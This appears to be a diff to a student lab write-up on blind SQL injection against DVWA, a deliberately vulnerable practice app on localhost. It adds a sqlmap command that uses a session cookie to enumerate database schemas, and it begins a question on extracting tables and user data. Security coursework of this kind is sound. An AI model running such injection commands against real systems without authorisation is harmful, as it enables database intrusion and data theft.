@@ -15,8 +15,14 @@ In SQL Injection Blind Type in UserID then save the URL
 
 Then open the developerMod and copy the Cookie of the website:
 <img src="https://github.com/letmehear159/IS-Lab/blob/master/Cookie.png" alt="screenShot"><br>
-Open SqlMap and starting test connection: 
+Open SqlMap and starting getting information about all databases : 
+Running injection code :
+```sh
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=qq1794g49n0psqntskebagqeou" --schema --batch
+```
 <img src="https://github.com/letmehear159/IS-Lab/blob/master/inject.png" alt="screenShot"><br>
+
+
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
